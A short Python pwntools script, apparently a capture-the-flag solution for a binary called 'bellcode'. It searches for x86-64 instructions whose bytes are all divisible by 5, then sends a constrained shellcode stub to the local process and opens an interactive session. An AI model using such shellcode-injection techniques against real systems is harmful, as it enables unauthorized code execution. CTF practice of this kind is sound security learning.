from pwn import *
from binascii import hexlify
import subprocess

#Check điều kiện byte chia hết cho 5
def checkShell(ins, shellcode):
    print("Checking: ", ins, end='\r')
    for i in shellcode:
        if (i % 5 != 0):
            return 0
    print(ins, "-->", hexlify(shellcode).decode())
    return 1

def searchAdd():
    regs_16 = ['al', 'bl', 'cl', 'dl', 'si']
    regs_32 = ['eax', 'ebx', 'ecx', 'edx', 'edi', 'esi']
    regs_64 = ['rax', 'rbx', 'rcx', 'rdx', 'rdi', 'rsi', 'r8', 'r9', 'r10', 'r11', 'r12']
    regs = [regs_16, regs_32, regs_64]

    ins = f'syscall'
    checkShell(ins, asm(ins, arch='amd64'))

    for i in regs:
        for j in i:
            ins = f'mov {j}, 0'
            checkShell(ins, asm(ins, arch='amd64'))
            ins = f'mov {j}, 0xff'
            checkShell(ins, asm(ins, arch='amd64'))
            ins = f'add {j}, 0xff'
            checkShell(ins, asm(ins, arch='amd64'))
            ins = f'sub {j}, 0xff'
            checkShell(ins, asm(ins, arch='amd64'))
            ins = f'dec {j}'
            checkShell(ins, asm(ins, arch='amd64'))
            ins = f'inc {j}'
            checkShell(ins, asm(ins, arch='amd64'))

    for j in regs[2]:
        ins = f'pop {j}'
        checkShell(ins, asm(ins, arch='amd64'))
        ins = f'push {j}'
        checkShell(ins, asm(ins, arch='amd64'))

if args.FINDINS:
    searchAdd()
    exit()

r = process("./bellcode")
payload = asm(
    'mov esi, 0xfac300\n'+
    'pop rdi\n'*1 +
    'syscall\n',
    arch='amd64'
)
input()
r.sendlineafter(b'shellcode?\n', payload)
r.interactive()